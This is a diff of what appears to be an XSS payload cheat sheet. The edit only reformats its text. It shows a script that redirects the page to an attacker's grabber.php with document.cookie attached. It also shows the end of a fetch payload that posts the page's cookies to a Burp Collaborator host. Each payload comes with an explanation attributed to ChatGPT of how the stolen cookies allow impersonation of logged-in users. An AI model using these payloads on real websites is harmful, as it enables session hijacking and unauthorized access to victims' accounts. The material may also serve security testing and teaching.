@@ -125,7 +125,11 @@ Obtains the administrator cookie or sensitive access token, the following payloa
 <script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
 ```
 **ChatGPT Explationation:**  
-This JavaScript code uses the document.location property to redirect the current page to a new URL, which is constructed by concatenating the string 'http://localhost/XSS/grabber.php?c=' with the document.cookie property. The document.cookie property is a string containing all the cookies for the current page. The resulting URL will look something like this: "http://localhost/XSS/grabber.php?c=session_id=abcdef; user_id=123456". The page is then redirect to this URL which will trigger a GET request to the specified address 'http://localhost/XSS/grabber.php' and passing the cookies as a query parameter 'c' . The script is sending all the cookies of the current website to a PHP script located on localhost, this script 'grabber.php' can be controlled by the attacker which can be used to steal the cookies and potentially gain unauthorized access to the user's account.
+1. This JavaScript code uses the document.location property to redirect the current page to a new URL, which is constructed by concatenating the string 'http://localhost/XSS/grabber.php?c=' with the document.cookie property. 
+2. The document.cookie property is a string containing all the cookies for the current page. 
+3. The resulting URL will look something like this: "http://localhost/XSS/grabber.php?c=session_id=abcdef; user_id=123456". 
+4. The page is then redirect to this URL which will trigger a GET request to the specified address 'http://localhost/XSS/grabber.php' and passing the cookies as a query parameter 'c'. 
+5. The script is sending all the cookies of the current website to a PHP script located on localhost, this script 'grabber.php' can be controlled by the attacker which can be used to steal the cookies and potentially gain unauthorized access to the user's account.
 
 
 ```html
@@ -172,7 +176,7 @@ This is a PHP script that is designed to receive a cookie value as a GET paramet
   });
 </script>
 ```
-**ChatGPT Explanation:**
+**ChatGPT Explanation:**  
 This JavaScript code uses the fetch function to send a POST request to a specified URL (in this case, https://<SESSION>.burpcollaborator.net) with the current document's cookies as the request body. The mode: 'no-cors' option is included to bypass the same-origin policy, which would otherwise block the request. This allows the attacker to send the victim's cookies to a server under their control. If the victim is currently logged in to the website, the attacker can use the stolen cookies to impersonate the victim and potentially gain unauthorized access to their account.
 
 
